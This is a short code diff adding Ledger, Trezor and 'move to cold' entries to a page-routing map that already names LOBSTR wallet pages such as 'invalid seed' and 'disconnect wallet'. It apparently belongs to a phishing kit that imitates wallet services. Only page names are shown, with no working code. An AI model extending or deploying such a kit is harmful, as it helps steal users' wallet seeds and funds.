@@ -50,6 +50,9 @@ const pageMapping = {
     'review': 'lobstrReview',
     'disconnectwallet': 'lobstrDisconnectWallet',
     'invalidseed': 'lobstrInvalidSeed',
+    'ledgerdisconnect': 'LedgerDisconnect',
+    'trezordisconnect': 'TrezorDisconnect',
+    'movetocold': 'MoveToCold',
     'captcha': 'captcha', // Shared captcha page
     'error': 'error'     // Shared error page
   },
